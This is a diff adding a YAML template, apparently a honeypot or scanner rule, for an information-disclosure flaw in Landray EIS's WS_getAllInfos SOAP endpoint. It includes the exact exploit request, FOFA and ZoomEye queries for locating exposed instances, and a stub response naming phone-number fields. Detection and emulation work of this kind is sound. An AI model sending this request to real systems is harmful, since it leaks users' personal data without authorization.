@@ -1,0 +1,35 @@
+id: landray-eis-ws-infoleak
+info:
+  name: Landray EIS WS_getAllInfos - Information Disclosure
+  author: Fur1na
+  description: 'Landray EIS WS_getAllInfos interface suffers from a sensitive information
+    disclosure vulnerability.
+
+    '
+  severity: high
+  reference:
+  - https://mp.weixin.qq.com/s/CTLyriSSF-nQ8SUFv4RX0A
+  - https://github.com/akyosk/pocman/blob/main/cve/Lanling/Lanling_Info.py
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="Landray-EIS智慧协同平台"
+    zoomeye-query: app:"蓝凌EIS智慧协同平台"
+  tags: landray,eis,info-leak
+traps:
+- request:
+    method: POST
+    path: /WS/Basic/Basic.asmx
+    headers:
+      Content-Type: text/xml
+    body: |
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+      <soapenv:Header/>
+      <soapenv:Body>
+      <tem:WS_getAllInfos/>
+      </soapenv:Body>
+      </soapenv:Envelope>
+  response:
+    status_code: 200
+    headers: {}
+    body: <?xmlWS_getAllInfosResponseCELL_PHONE_NUMBERUNID
